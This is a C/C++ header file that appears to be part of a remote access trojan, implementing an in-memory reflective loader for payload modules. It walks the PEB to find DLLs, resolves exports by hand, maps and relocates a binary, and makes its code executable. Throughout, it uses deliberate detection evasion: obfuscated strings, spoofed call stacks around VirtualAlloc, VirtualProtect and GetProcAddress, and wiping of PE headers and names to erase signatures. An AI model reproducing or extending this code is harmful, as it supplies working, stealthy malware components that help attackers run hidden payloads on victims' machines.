#pragma once

PBYTE GetDllBase(char* dllName) {
    size_t dllNameLen = StrLen(dllName);
    if (dllNameLen > 4) { // 去除 .dll 后缀, 因为后缀大小写不确定容易出错
        dllName[dllNameLen - 4] = '\0';
    }
    PBYTE pDll = NULL;
    if (IsEqual(dllName, OBFSTR("Stub", "OBFSIG"))) { // ExeLite 导入 RAT 的内部函数
        pDll = (PBYTE)0x01;
        goto End;
    }
    DWORD_PTR _PEB = __readgsqword(0x60);
    DWORD_PTR _PEB_LDR_DATA = *(PDWORD_PTR)(_PEB + 0x18);
    PLIST_ENTRY pInInitializationOrderModuleList = (PLIST_ENTRY) * (PDWORD_PTR)(_PEB_LDR_DATA + 0x30);
    PLIST_ENTRY pNode = pInInitializationOrderModuleList;
    do {
        char curDllName[20];
        PUNICODE_STRING wString = (PUNICODE_STRING)((PBYTE)pNode + 0x38);
        size_t curDllNameLen = wString->Length / sizeof(wchar_t) - 4;
        if (curDllNameLen < sizeof(curDllName)) {
            for (size_t i = 0; i < curDllNameLen; i++) {
                curDllName[i] = wString->Buffer[i];
            }
            curDllName[curDllNameLen] = '\0';
            if (IsEqual(curDllName, dllName)) {
                pDll = (PBYTE) * (PDWORD_PTR)((PBYTE)pNode + 0x10);
                break;
            }
        }
        pNode = pNode->Flink;
    } while (pNode->Flink != pInInitializationOrderModuleList);
    if (pDll == NULL) {
        pDll = (PBYTE)SPOOF(LoadLibraryA, 1, dllName);
    }
End:
    memset(dllName, 0, dllNameLen); // 去除特征字符串
    return pDll;
}

PBYTE FindExpFuncAddr(PBYTE pImageBase, char* funcName, WORD ordinal) {
    PBYTE pFunc = NULL;
    if (pImageBase == (PBYTE)0x01) { // ExeLite 导入 RAT 的内部函数
        if (IsEqual(funcName, OBFSTR("JmpToFunc", "OBFSIG"))) {
            pFunc = (PBYTE)JmpToFunc;
        }
        else if (IsEqual(funcName, OBFSTR("SetSpoofStack", "OBFSIG"))) {
            pFunc = (PBYTE)SetSpoofStack;
        }
        else if (IsEqual(funcName, OBFSTR("GetSpoofStack", "OBFSIG"))) {
            pFunc = (PBYTE)GetSpoofStack;
        }
        else if (IsEqual(funcName, OBFSTR("GetRand", "OBFSIG"))) {
            pFunc = (PBYTE)GetRand;
        }
        else if (IsEqual(funcName, OBFSTR("MySleep", "OBFSIG"))) {
            pFunc = (PBYTE)MySleep;
        }
        else if (IsEqual(funcName, OBFSTR("SafeAlloc", "OBFSIG"))) {
            pFunc = (PBYTE)SafeAlloc;
        }
        else if (IsEqual(funcName, OBFSTR("SafeReAlloc", "OBFSIG"))) {
            pFunc = (PBYTE)SafeReAlloc;
        }
        else if (IsEqual(funcName, OBFSTR("SafeFree", "OBFSIG"))) {
            pFunc = (PBYTE)SafeFree;
        }
        else if (IsEqual(funcName, OBFSTR("WStrToStr", "OBFSIG"))) {
            pFunc = (PBYTE)WStrToStr;
        }
        else if (IsEqual(funcName, OBFSTR("StrToWStr", "OBFSIG"))) {
            pFunc = (PBYTE)StrToWStr;
        }
        else if (IsEqual(funcName, OBFSTR("Base64Encode", "OBFSIG"))) {
            pFunc = (PBYTE)Base64Encode;
        }
        else if (IsEqual(funcName, OBFSTR("Base64Decode", "OBFSIG"))) {
            pFunc = (PBYTE)Base64Decode;
        }
        else if (IsEqual(funcName, OBFSTR("AsyncCommandOutput", "OBFSIG"))) {
            pFunc = (PBYTE)AsyncCommandOutput;
        }
        goto End;
    }
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pImageBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDataDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pImageBase + exportDataDir.VirtualAddress);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    DWORD numberOfFunctions = pExportDir->NumberOfFunctions;
    PDWORD pAddressOfFunctions = (PDWORD)(pImageBase + pExportDir->AddressOfFunctions);
    PDWORD pAddressOfNames = (PDWORD)(pImageBase + pExportDir->AddressOfNames);
    PWORD pAddressOfNameOrdinals = (PWORD)(pImageBase + pExportDir->AddressOfNameOrdinals);
    if (funcName == NULL) {
        DWORD index = ordinal - pExportDir->Base;
        if (index >= 0 && index < numberOfFunctions) {
            pFunc = pImageBase + pAddressOfFunctions[index];
        }
    }
    else {
        for (size_t i = 0; i < numberOfNames; i++) {
            char* curFuncName = (char*)pImageBase + pAddressOfNames[i];
            if (IsEqual(curFuncName, funcName)) {
                pFunc = pImageBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]];
                break;
            }
        }
    }
    if (pFunc != NULL && pFunc >= (PBYTE)pExportDir && pFunc < (PBYTE)pExportDir + exportDataDir.Size) {
        pFunc = NULL; // 重定向
    }
    if (pFunc == NULL) {
        if (funcName != NULL) {
            pFunc = (PBYTE)SPOOF(GetProcAddress, 2, (HMODULE)pImageBase, funcName);
        }
        else {
            pFunc = (PBYTE)SPOOF(GetProcAddress, 2, (HMODULE)pImageBase, (char*)ordinal);
        }
    }
End:
    if (funcName != NULL) {
        memset(funcName, 0, StrLen(funcName)); // 去除特征字符串
    }
    return pFunc;
}

void RefLoader(PBYTE pBin, stringObj& hash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBin;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBin + pDos->e_lfanew);
    WORD numberOfSections = pNt->FileHeader.NumberOfSections;
    DWORD_PTR imageBase = pNt->OptionalHeader.ImageBase;
    DWORD sizeOfImage = pNt->OptionalHeader.SizeOfImage;
    DWORD exportDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]))->VirtualAddress;
    DWORD importDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]))->VirtualAddress;
    DWORD relocDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]))->VirtualAddress;
    memset(pDos, 0, pDos->e_lfanew); // 去除 DOS 特征

    PVOID pText = NULL;
    size_t textSize = 0;
    PBYTE pImageBase = (PBYTE)SPOOF(VirtualAlloc, 4, NULL, sizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    if (pImageBase == NULL) {
        return;
    }
    PIMAGE_SECTION_HEADER pSectionTable = (PIMAGE_SECTION_HEADER)((DWORD_PTR) & (pNt->OptionalHeader) + pNt->FileHeader.SizeOfOptionalHeader);
    for (size_t i = 0; i < numberOfSections; i++) {
        if (IsEqual((char*)pSectionTable[i].Name, OBFSTR(".text", "OBFSIG"))) {
            pText = pImageBase + pSectionTable[i].VirtualAddress;
            textSize = pSectionTable[i].SizeOfRawData;
        }
        memcpy(pImageBase + pSectionTable[i].VirtualAddress, pBin + pSectionTable[i].PointerToRawData, pSectionTable[i].SizeOfRawData);
    }
    if (pText == NULL) {
        return;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImportDir = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBase + importDirRVA);
    while (pImportDir->FirstThunk) {
        PBYTE pDll = GetDllBase((char*)(pImageBase + pImportDir->Name));
        if (pDll == NULL) {
            return;
        }
        PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pImageBase + pImportDir->FirstThunk);
        while (pIAT->u1.AddressOfData) {
            PBYTE pFunc = NULL;
            if (IMAGE_SNAP_BY_ORDINAL(pIAT->u1.Ordinal)) {
                pFunc = FindExpFuncAddr(pDll, NULL, IMAGE_ORDINAL(pIAT->u1.Ordinal));
            }
            else {
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImageBase + pIAT->u1.AddressOfData);
                pFunc = FindExpFuncAddr(pDll, pImportByName->Name, -1);
            }
            if (pFunc == NULL) {
                return;
            }
            *(PDWORD_PTR)pIAT = (DWORD_PTR)pFunc;
            pIAT++;
        }
        pImportDir++;
    }

    PIMAGE_BASE_RELOCATION pRelocDir = (PIMAGE_BASE_RELOCATION)(pImageBase + relocDirRVA);
    while (pRelocDir->SizeOfBlock) {
        PWORD pTypeOffset = (PWORD)((DWORD_PTR)pRelocDir + sizeof(IMAGE_BASE_RELOCATION));
        size_t typeOffsetNum = (pRelocDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        while (typeOffsetNum--) {
            if (pTypeOffset[typeOffsetNum] >> 12 == IMAGE_REL_BASED_DIR64) {
                *(PDWORD_PTR)(pImageBase + pRelocDir->VirtualAddress + (pTypeOffset[typeOffsetNum] & 0xFFF)) += (DWORD_PTR)pImageBase - imageBase;
            }
        }
        pRelocDir = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocDir + pRelocDir->SizeOfBlock);
    }

    DWORD oldProtect;
    if (!SPOOF(VirtualProtect, 4, pText, textSize, PAGE_EXECUTE_READ, &oldProtect)) {
        return;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pImageBase + exportDirRVA);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    DWORD numberOfFunctions = pExportDir->NumberOfFunctions;
    PDWORD pAddressOfFunctions = (PDWORD)(pImageBase + pExportDir->AddressOfFunctions);
    PDWORD pAddressOfNames = (PDWORD)(pImageBase + pExportDir->AddressOfNames);
    PWORD pAddressOfNameOrdinals = (PWORD)(pImageBase + pExportDir->AddressOfNameOrdinals);
    char* binName = (char*)pImageBase + pExportDir->Name;
    memset(binName, 0, StrLen(binName)); // 去除特征字符串
    mapObj<pointer> funcInfo;
    funcInfo.Set(OBFSTR("entry", "OBFSIG"), pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
    for (size_t i = 0; i < numberOfNames; i++) {
        char* funcName = (char*)pImageBase + pAddressOfNames[i];
        funcInfo.Set(funcName, pImageBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        memset(funcName, 0, StrLen(funcName)); // 去除特征字符串
    }
    hashInfo.Set(hash, funcInfo);
    updateSessionInfo = 1;
}